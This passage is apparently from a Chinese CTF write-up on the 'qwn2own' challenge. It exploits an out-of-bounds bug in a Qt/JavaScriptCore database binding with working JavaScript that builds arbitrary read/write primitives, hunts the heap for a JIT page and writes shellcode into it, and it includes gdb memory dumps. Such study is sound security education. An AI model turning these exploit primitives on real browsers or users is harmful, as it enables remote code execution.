<p>此时通过inset可以将size值修改为任意值，从而达到任意地址读取的效果。</p>
<p><code>A.insert(0,0xffff000000001);</code></p>
<p>如图所示，我们将size值改为了0xffff（还要保证ref&#x3D;1，否则会被垃圾回收机制干掉），于是后面的地址都能打印出来了。</p>
<p><img src="https://github.com/migraine-sudo/blog_image_management/raw/master/uPic/gaRG9R.png" alt="gaRG9R"> </p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">poc2.html</span><br><span class="line">&lt;div id=<span class="string">&quot;print&quot;</span>&gt;&lt;/div&gt;</span><br><span class="line">&lt;script type=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><br><span class="line">	var db=BKPDataBase.create(<span class="string">&quot;dbname&quot;</span>,<span class="string">&quot;passwd&quot;</span>);</span><br><span class="line">	var A=db.createStore(<span class="string">&quot;db1&quot;</span>,<span class="number">1</span>,[<span class="number">0</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>],<span class="number">0xaabb</span>);</span><br><span class="line"></span><br><span class="line">	A.remove(<span class="number">-1</span>);</span><br><span class="line">	A.insert(<span class="number">0</span>,<span class="number">0xffff000000001</span>);</span><br><span class="line">var x=<span class="string">&quot;&quot;</span>;</span><br><span class="line">	<span class="keyword">for</span>(var i=<span class="number">0</span>;i&lt;<span class="number">15</span>;i++)</span><br><span class="line">	&#123;</span><br><span class="line">		x+=i+<span class="string">&quot; : &quot;</span>+A.get(i).toString(<span class="number">16</span>)+<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	document.getElementById(<span class="string">&quot;print&quot;</span>).innerHTML=x;</span><br><span class="line">&lt;/script&gt;	</span><br></pre></td></tr></table></figure>
<h2 id="2-构造Exploit"><a href="#2-构造Exploit" class="headerlink" title="2.构造Exploit"></a>2.构造Exploit</h2><p>一些要点：Js的heap和QT（我们这次分析的）的heap是分开的，QT直接用的libc的heap。所以内存查找不用担心找到js中的key1</p>
<p>通过匹配store_ping值，寻找C对象的BKPStore结构地址</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&lt;div id=<span class="string">&quot;print&quot;</span>&gt;&lt;/div&gt;</span><br><span class="line">&lt;script type=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><br><span class="line">	var db=BKPDataBase.create(<span class="string">&quot;dbname&quot;</span>,<span class="string">&quot;passwd&quot;</span>);</span><br><span class="line">	var key1=<span class="number">0xabcd1234</span>;</span><br><span class="line">	var B=db.createStore(<span class="string">&quot;B&quot;</span>,<span class="number">1</span>,[<span class="number">0</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>],<span class="number">0xaabb</span>);</span><br><span class="line">	var C=db.createStore(<span class="string">&quot;C&quot;</span>,<span class="number">1</span>,[<span class="number">0</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>],key1);</span><br><span class="line">	B.remove(<span class="number">-1</span>);</span><br><span class="line">	B.insert(<span class="number">0</span>,<span class="number">0xffff000000001</span>);</span><br><span class="line"></span><br><span class="line">	var x=<span class="string">&quot;&quot;</span>;</span><br><span class="line">	<span class="keyword">for</span>(var i=<span class="number">0</span>;i&lt;<span class="number">2000</span> ;i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="comment">//x+=i+&quot; : &quot;+B.get(i).toString(16)+&quot;&lt;br&gt;&quot;;</span></span><br><span class="line">		<span class="keyword">if</span>(B.get(i)==key1)&#123;</span><br><span class="line">			<span class="comment">//alert(&quot;i=&quot;+i);</span></span><br><span class="line">			<span class="keyword">for</span>(var j=i<span class="number">-10</span>;j&lt;i+<span class="number">10</span>;j++)</span><br><span class="line">			&#123;</span><br><span class="line">				x+=j+<span class="string">&quot; : &quot;</span>+B.get(j).toString(<span class="number">16</span>)+<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">			&#125;	</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	document.getElementById(<span class="string">&quot;print&quot;</span>).innerHTML=x;</span><br><span class="line">&lt;/script&gt;	</span><br></pre></td></tr></table></figure>
<p>构造两个Vector，读取另一个的虚函数表</p>
<p>判断条件 store_ping参数 ，对照结构可以取到第二个Vector的intvect地址</p>
<p>BKPStore结构参考</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">  quint8 type; <span class="comment">// specifies which type to of vector</span></span><br><span class="line">​         <span class="comment">// to use</span></span><br><span class="line">  QVector&lt;QVariant&gt; varvect;</span><br><span class="line">  QVector&lt;qulonglong&gt; intvect;</span><br><span class="line">  QVector&lt;QString&gt; strvect;</span><br><span class="line">  qulonglong store_ping;</span><br></pre></td></tr></table></figure>
<p>JS打印出了BKPStore的结构，我们可以获取这个QVector的地址还有后文用于泄漏地址的Vtable地址。</p>
<p>打印地址时候需要注意的是，因为创建大量的内存，heap内部空间会比较乱，很可能读取到上一次遗留&#x2F;错误的地址。添加一个判断条件来保证BKPStore的正确性，必须保证读取到的strvect和varvect相等（未初始化状态），</p>
<p><img src="https://github.com/migraine-sudo/blog_image_management/raw/master/uPic/Jl8lBo.png" alt="Jl8lBo"> </p>
<p>intvect的内容，指向QArrayData结构</p>
<p><img src="https://github.com/migraine-sudo/blog_image_management/raw/master/uPic/NTNUgv.png" alt="NTNUgv"></p>
<h3 id="2-1实现任意地址读写"><a href="#2-1实现任意地址读写" class="headerlink" title="2.1实现任意地址读写"></a>2.1实现任意地址读写</h3><p>任意地址写的思路很简单，通过控制对象C_Vector的offset大小，实现任意地址读写。修改offset的方法，只需通过BVector的越界读写修改C的offset即可</p>
<p>实现代码</p>
<p>使用read读取vtable的内容</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line">&lt;div id=<span class="string">&quot;out&quot;</span>&gt;&lt;/div&gt;</span><br><span class="line">&lt;script type=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">print</span>(<span class="params">str</span>)</span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="built_in">document</span>.getElementById(<span class="string">&quot;out&quot;</span>).innerHTML+=str+<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">exploit</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="comment">//任意地址读</span></span><br><span class="line">		<span class="function"><span class="keyword">function</span> <span class="title">read</span>(<span class="params">addr</span>)</span></span><br><span class="line"><span class="function">		</span>&#123;</span><br><span class="line">			offset=addr-C_vec; <span class="comment">//计算读取地址和Cvector数组的距离</span></span><br><span class="line">			B.insert(B2C_index-<span class="number">1</span>,offset); <span class="comment">//修改offset为距离</span></span><br><span class="line">			info=C.get(<span class="number">0</span>); <span class="comment">//读取</span></span><br><span class="line">			<span class="keyword">if</span>(C.get(<span class="number">0</span>)==key2)	<span class="comment">//检测offset是否成功修改	</span></span><br><span class="line">				<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">B.insert(B2C_index-<span class="number">1</span>,<span class="number">0</span>);</span><br><span class="line">			<span class="keyword">return</span> info;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">1000</span>; i &gt;= <span class="number">0</span>; i--) &#123;</span><br><span class="line">				<span class="keyword">var</span> db=BKPDataBase.create(<span class="string">&quot;dbname&quot;</span>,<span class="string">&quot;passwd&quot;</span>);</span><br><span class="line">				<span class="keyword">var</span> key1=<span class="built_in">Math</span>.floor(<span class="built_in">Math</span>.random()*<span class="number">1e12</span>); <span class="comment">//随机生成</span></span><br><span class="line">				<span class="keyword">var</span> key2=<span class="built_in">Math</span>.floor(<span class="built_in">Math</span>.random()*<span class="number">1e12</span>); </span><br><span class="line">				<span class="keyword">var</span> B=db.createStore(<span class="string">&quot;B&quot;</span>,<span class="number">1</span>,[<span class="number">0</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>],<span class="number">0xabc</span>);</span><br><span class="line">				<span class="keyword">var</span> C=db.createStore(<span class="string">&quot;C&quot;</span>,<span class="number">1</span>,[key2,<span class="number">0xbbbb</span>,<span class="number">0xdeadbeef</span>],key1);</span><br><span class="line">				B.remove(-<span class="number">1</span>);</span><br><span class="line">				B.insert(<span class="number">0</span>,<span class="number">0xffff000000001</span>);</span><br><span class="line"></span><br><span class="line">				<span class="keyword">var</span> B2C_index=-<span class="number">1</span>; <span class="comment">//B-&gt;QArrayData数组 到 C -&gt;QArrayData 的距离</span></span><br><span class="line">				<span class="keyword">var</span> C_vec=-<span class="number">1</span>;<span class="comment">//C-&gt;QArrayData</span></span><br><span class="line">				<span class="keyword">var</span> vtable;</span><br><span class="line">				<span class="keyword">var</span> x=<span class="string">&quot;&quot;</span>;</span><br><span class="line">				<span class="comment">//获取 C_vec地址</span></span><br><span class="line">				<span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>;i&lt;<span class="number">2000</span> ;i++)</span><br><span class="line">				&#123;</span><br><span class="line">					<span class="keyword">if</span>(B.get(i)==key1&amp;&amp;B.get(i-<span class="number">1</span>)==B.get(i-<span class="number">3</span>)&amp;&amp;C_vec==-<span class="number">1</span>)&#123;</span><br><span class="line">						C_vec=B.get(i-<span class="number">2</span>);</span><br><span class="line">						vtable=B.get(i-<span class="number">6</span>);</span><br><span class="line">						<span class="comment">//alert(vtable.toString(16));</span></span><br><span class="line">					&#125;	</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>;i&lt;<span class="number">2000</span> ;i++)</span><br><span class="line">				&#123;</span><br><span class="line">					<span class="keyword">if</span>(B.get(i)==key2&amp;&amp;B.get(i+<span class="number">1</span>)==<span class="number">0xbbbb</span>&amp;&amp;B.get(i+<span class="number">2</span>)==<span class="number">0xdeadbeef</span>&amp;&amp;B2C_index==-<span class="number">1</span>)&#123;</span><br><span class="line">						B2C_index=i;</span><br><span class="line">					&#125;	</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">if</span>(B2C_index!=-<span class="number">1</span>&amp;&amp;C_vec!=-<span class="number">1</span>)</span><br><span class="line">				&#123;</span><br><span class="line">					x=(<span class="string">&quot;C_vec=&quot;</span>+C_vec.toString(<span class="number">16</span>)+<span class="string">&quot;&lt;br&gt;&quot;</span>);</span><br><span class="line">					x+=(<span class="string">&quot;B2C_index=&quot;</span>+B2C_index.toString(<span class="number">16</span>)+<span class="string">&quot;&lt;br&gt;&quot;</span>);</span><br><span class="line">					<span class="keyword">if</span>(read(vtable)==<span class="literal">false</span>)</span><br><span class="line">						<span class="keyword">continue</span>;</span><br><span class="line">					x+=<span class="string">&quot;info=&quot;</span>+read(vtable).toString(<span class="number">16</span>); <span class="comment">//读取vtable的值</span></span><br><span class="line">					print(x);</span><br><span class="line">					<span class="keyword">break</span>;</span><br><span class="line">				&#125;		</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	exploit();</span><br><span class="line">&lt;/script&gt;	</span><br></pre></td></tr></table></figure>


<p><img src="https://github.com/migraine-sudo/blog_image_management/raw/master/uPic/ydW7KE.png" alt="ydW7KE"> </p>
<p>Gdb attach到浏览器，查看虚函数表地址</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">gef➤  x&#x2F;20xg 0x55f34f2ed400</span><br><span class="line">0x55f34f2ed400 &lt;_ZTV8BKPStore+16&gt;:	0x000055f34f0e8b80	0x000055f34f0e8eb0</span><br><span class="line">0x55f34f2ed410 &lt;_ZTV8BKPStore+32&gt;:	0x000055f34f0e8ff0	0x000055f34f0e93d0</span><br><span class="line">0x55f34f2ed420 &lt;_ZTV8BKPStore+48&gt;:	0x000055f34f0e9230	0x00007f7f7d357b10</span><br></pre></td></tr></table></figure>
<p>同理任意地址写的代码只需把read函数的get换成insert</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">function <span class="title">write</span><span class="params">(addr,content)</span></span></span><br><span class="line"><span class="function">		</span>&#123;</span><br><span class="line">			offset=addr-C_vec;</span><br><span class="line">			B.insert(B2C_index<span class="number">-1</span>,offset); <span class="comment">//修改offset</span></span><br><span class="line">			<span class="keyword">if</span>(C.get(<span class="number">0</span>)==key2)	<span class="comment">//检测offset是否成功修改	</span></span><br><span class="line">				<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">			C.insert(<span class="number">0</span>,content);</span><br><span class="line">			<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">		&#125;</span><br></pre></td></tr></table></figure>
<p>不过这里，任意地址写没办法修改虚函数表，会报段错误。</p>
<p>修改程序流程只需要将vtable覆盖即可，不过这次的案例并不会覆盖虚表的方式，而会使用JIT Page的方式写入shellcode。</p>
<p>漏洞分析完毕，下面开始写利用</p>
<h3 id="2-2利用手法"><a href="#2-2利用手法" class="headerlink" title="2.2利用手法"></a>2.2利用手法</h3><p>看大佬的分析，主要两种利用方式</p>
<p>1.传统的泄漏地址，绕过ASLR</p>
<p>2.使用JIT Page写shellcode（JIT SPray）</p>
<p>参考文献 <a target="_blank" rel="noopener" href="https://www.usenix.org/sites/default/files/conference/protected-files/woot18_slides_gawlik.pdf">https://www.usenix.org/sites/default/files/conference/protected-files/woot18_slides_gawlik.pdf</a></p>
<p>[<a target="_blank" rel="noopener" href="https://conference.hitb.org/hitbsecconf2010ams/materials/D1T2%20-%20Alexey%20Sintsov%20-%20JIT%20Spray%20Attacks%20and%20Advanced%20Shellcode.pdf]">https://conference.hitb.org/hitbsecconf2010ams/materials/D1T2%20-%20Alexey%20Sintsov%20-%20JIT%20Spray%20Attacks%20and%20Advanced%20Shellcode.pdf]</a>(<a target="_blank" rel="noopener" href="https://conference.hitb.org/hitbsecconf2010ams/materials/D1T2">https://conference.hitb.org/hitbsecconf2010ams/materials/D1T2</a> - Alexey Sintsov - JIT Spray Attacks and Advanced Shellcode.pdf)</p>
<h4 id="JITPage写Shellcode"><a href="#JITPage写Shellcode" class="headerlink" title="JITPage写Shellcode"></a>JITPage写Shellcode</h4><p>Javascriptcore Heap（JIT Page所在Heap）和QT的Heap（QT用的libc堆）地址不在同一个堆中，所以需要在QT的heap中找到指向JIT Page的指针。</p>
<p>首先在exploit开头创建一个func，并且循环调用。JIT会将循环多次的func转化为机器码以提高效率。将func的地址写入数组，并且以特定个格式存储，以便之后在内存查找func地址。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> bab = <span class="string">&quot;Migraine&quot;</span>;</span><br><span class="line">		targeted = <span class="function"><span class="keyword">function</span>(<span class="params">a</span>) </span>&#123;</span><br><span class="line">		        <span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i&lt; <span class="number">10000</span>; i++)&#123;</span><br><span class="line">		                a = a^<span class="number">0x123456</span>^<span class="number">0x3eeee</span>;</span><br><span class="line">		                a= a^<span class="number">0x1666456</span>^<span class="number">0x3e66ee</span>;</span><br><span class="line">		        &#125;</span><br><span class="line">		        <span class="keyword">return</span> a^<span class="number">0x66666</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">		_yol = <span class="keyword">new</span> <span class="built_in">Array</span>(<span class="number">20</span>);</span><br><span class="line">		<span class="keyword">for</span> (i=<span class="number">0</span>;i&lt;<span class="number">20</span>;i++)</span><br><span class="line">		        _yol[i] = bab;</span><br><span class="line">				_yol[<span class="number">13</span>] = targeted;</span><br><span class="line">		</span><br><span class="line">		func_addr = <span class="literal">null</span>;</span><br></pre></td></tr></table></figure>
<p>获取JIT page指针（实现任意地址读写之后）</p>
<p>JIT指针内存，看到我们写入func被JIT编译为了机器码。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(jimbo=C_vec;func_addr==<span class="literal">null</span>;jimbo=jimbo-<span class="number">8</span>)</span><br><span class="line">					&#123;</span><br><span class="line">						chunksz=read(jimbo);</span><br><span class="line">						<span class="keyword">if</span>(chunksz&lt;=<span class="number">0x20</span>||(chunksz&amp;<span class="number">0xf1</span>)!=chunksz)</span><br><span class="line">							<span class="keyword">continue</span>;</span><br><span class="line">						chunksz = chunksz - chunksz &amp; <span class="number">1</span>;</span><br><span class="line">        				nextsz = read(jimbo+chunksz);</span><br><span class="line">        				<span class="keyword">if</span> (nextsz &lt; <span class="number">0x20</span> || (nextsz &amp; <span class="number">0xfff1</span>) != nextsz || (nextsz&amp;<span class="number">1</span>)!=<span class="number">1</span>)</span><br><span class="line">                			<span class="keyword">continue</span>;</span><br><span class="line">												heapaddr = read(jimbo+<span class="number">10</span>*<span class="number">8</span>);</span><br><span class="line">        				<span class="keyword">if</span> ((heapaddr &lt;= C_vec) || ((heapaddr &amp; <span class="number">0xfff</span>) != <span class="number">0</span>))</span><br><span class="line">               				 <span class="keyword">continue</span>;</span><br><span class="line">        				</span><br><span class="line">        				<span class="keyword">if</span> (heapaddr != read(jimbo + <span class="number">11</span>*<span class="number">8</span>))</span><br><span class="line">                			<span class="keyword">continue</span>;</span><br><span class="line">						</span><br><span class="line">						nbregions = read(jimbo+<span class="number">2</span>*<span class="number">8</span>);</span><br><span class="line">        				regsz = read(jimbo+<span class="number">4</span>*<span class="number">8</span>);</span><br><span class="line">        				heapsz = read(jimbo + <span class="number">12</span>*<span class="number">8</span>);</span><br><span class="line">        				<span class="keyword">if</span> (nbregions != <span class="number">2</span> || ((heapsz &amp; <span class="number">0xfff</span>) != <span class="number">0</span>) || ((regsz &amp; <span class="number">0xfff</span>) != <span class="number">0</span>) || heapsz == <span class="number">0</span> || nbregions*regsz != heapsz)</span><br><span class="line">        				        <span class="keyword">continue</span>;</span><br><span class="line">						<span class="keyword">for</span> (i=<span class="number">8</span>;i&lt;heapsz;i+=<span class="number">8</span>) &#123;</span><br><span class="line">               				 babar = read(heapaddr + i);</span><br><span class="line">                		<span class="keyword">if</span> (babar &lt; C_vec) <span class="keyword">continue</span>;</span><br><span class="line">                			match = <span class="literal">true</span>;</span><br><span class="line">                		<span class="keyword">for</span> (j=<span class="number">1</span>;j&lt;<span class="number">20</span>;j++) &#123;</span><br><span class="line">                     	   <span class="keyword">if</span> (((j == <span class="number">13</span>) &amp;&amp; (read(heapaddr + i + j*<span class="number">8</span>) == babar)) || ((j != <span class="number">13</span>) &amp;&amp; (read(heapaddr + i + j*<span class="number">8</span>) != babar))) &#123;</span><br><span class="line">                                match = <span class="literal">false</span>;</span><br><span class="line">                                <span class="keyword">break</span>;</span><br><span class="line">                        	&#125;</span><br><span class="line">                		&#125;</span><br><span class="line">                		<span class="keyword">if</span> (match == <span class="literal">true</span>) &#123;</span><br><span class="line">                     	   func_addr = read(heapaddr + i + <span class="number">13</span>*<span class="number">8</span>);</span><br><span class="line">                    	    <span class="keyword">break</span>;</span><br><span class="line">                		&#125;</span><br><span class="line">        			&#125;</span><br><span class="line">        					targeted(<span class="number">123</span>);</span><br><span class="line">        			        jit_ptr = read(func_addr + <span class="number">8</span>*<span class="number">3</span>) + <span class="number">8</span>*<span class="number">4</span>;</span><br><span class="line">        					jit_addr =read(jit_ptr);</span><br><span class="line">					&#125;</span><br><span class="line">        print(<span class="string">&quot;func_addr=&quot;</span>+func_addr.toString(<span class="number">16</span>)+<span class="string">&quot;&lt;br&gt;&quot;</span>);</span><br><span class="line">        print(<span class="string">&quot;jit_addr=&quot;</span>+_addr.toString(<span class="number">16</span>)+<span class="string">&quot;&lt;br&gt;&quot;</span>);</span><br></pre></td></tr></table></figure>
<p><img src="https://github.com/migraine-sudo/blog_image_management/raw/master/uPic/SSmzc8.png" alt="SSmzc8"> </p>
<p>这里的JIT page是RWX，所以直接写shellcode就行。之后调用func就会执行shellcode。</p>
<p>而不是通过覆盖指向JIT的Point来控制程序流。</p>
<p>不过目前大多数引擎都支持了对JIT Page的防护，JIT Page程序没有写入和执行（除非call func）权限，就需要使用JIT Spray和JIT-ROP。</p>
<p><img src="https://github.com/migraine-sudo/blog_image_management/raw/master/uPic/nEj8oX.png" alt="nEj8oX"> </p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i =<span class="number">0</span>; i &lt; shellcode.length; i++) &#123;</span><br><span class="line">	write(jit_addr+i,shellcode.charCodeAt(i));</span><br><span class="line">	&#125;</span><br><span class="line"><span class="comment">//alert(1);//for attac</span></span><br><span class="line">targeted(<span class="number">123</span>);<span class="comment">//exploit</span></span><br></pre></td></tr></table></figure>
<p><img src="https://github.com/migraine-sudo/blog_image_management/raw/master/uPic/cOHgZ4.png" alt="cOHgZ4"> </p>
<h4 id="泄漏地址（留坑）"><a href="#泄漏地址（留坑）" class="headerlink" title="泄漏地址（留坑）"></a>泄漏地址（留坑）</h4><p><strong>获取qwn2own基地址</strong></p>
<p>读者应该还记得，之前泄漏BKPStore结构时，我们能够leak虚函数表，因为vtable虚函数表在程序内的偏移是固定的，于qwn2own 基地址偏移0x2103F0.</p>
<p>而stroe_ping-6的位置，存放这BKPStore的虚函数表（偏移0n16）</p>
<p><img src="https://github.com/migraine-sudo/blog_image_management/raw/master/uPic/VW4NxY.png" alt="VW4NxY"> </p>
<p>查看读取出的虚函数表</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">gef➤  x/<span class="number">20</span> <span class="number">0x55a2cd227400</span>  （后又重新运行，导致vtable地址和图片不一致）</span><br><span class="line"><span class="number">0x55a2cd227400</span> &lt;_ZTV8BKPStore+<span class="number">16</span>&gt;:	<span class="number">0x000055a2cd022b80</span>	<span class="number">0x000055a2cd022eb0</span></span><br><span class="line"><span class="number">0x55a2cd227410</span> &lt;_ZTV8BKPStore+<span class="number">32</span>&gt;:	<span class="number">0x000055a2cd022ff0</span>	<span class="number">0x000055a2cd0233d0</span></span><br><span class="line"><span class="number">0x55a2cd227420</span> &lt;_ZTV8BKPStore+<span class="number">48</span>&gt;:	<span class="number">0x000055a2cd023230</span>	<span class="number">0x00007f1544ddbb10</span></span><br><span class="line"><span class="number">0x55a2cd227430</span> &lt;_ZTV8BKPStore+<span class="number">64</span>&gt;:	<span class="number">0x00007f1544dd7810</span>	<span class="number">0x00007f1544dd7820</span></span><br></pre></td></tr></table></figure>
<p>获取Binary的Base_address之后，可以通过泄漏got表来计算各个模块的基地址，也可以使用DT_DEBUG获取(详见参考文献)</p>
<blockquote>
<p>留坑</p>
</blockquote>
<p><strong>实现_dl_runtime_resolve函数</strong></p>
<p>dynamic段的定义（glibc&#x2F;elf&#x2F;elf.h）</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">typedef struct</span><br><span class="line">&#123;</span><br><span class="line">  Elf64_Sxword	d_tag;	&#x2F;&#x2F;8 byte		&#x2F;* Dynamic entry type *&#x2F;</span><br><span class="line">  Union &#x2F;&#x2F;联合类型 8 byte</span><br><span class="line">    &#123;</span><br><span class="line">      Elf64_Xword d_val;		&#x2F;* Integer value *&#x2F;</span><br><span class="line">      Elf64_Addr d_ptr;			&#x2F;* Address value *&#x2F;</span><br><span class="line">    &#125; d_un;</span><br><span class="line">&#125; Elf64_Dyn;  &#x2F;&#x2F;16 byte</span><br><span class="line"></span><br><span class="line">&#x2F;* Legal values for d_tag (dynamic entry type).  *&#x2F;</span><br><span class="line"></span><br><span class="line">#define DT_NULL		0		&#x2F;* Marks end of dynamic section *&#x2F;</span><br><span class="line">#define DT_NEEDED	1		&#x2F;* Name of needed library *&#x2F;</span><br><span class="line">#define DT_STRTAB	5		&#x2F;* Address of string table *&#x2F;</span><br><span class="line">#define DT_SYMTAB	6		&#x2F;* Address of symbol table *&#x2F;</span><br><span class="line"></span><br><span class="line">gef➤  elfheader </span><br><span class="line">.dynsym &#x3D; 0x55a2cd0172e0</span><br><span class="line">.dynstr &#x3D; 0x55a2cd018738</span><br><span class="line">.gnu.version &#x3D; 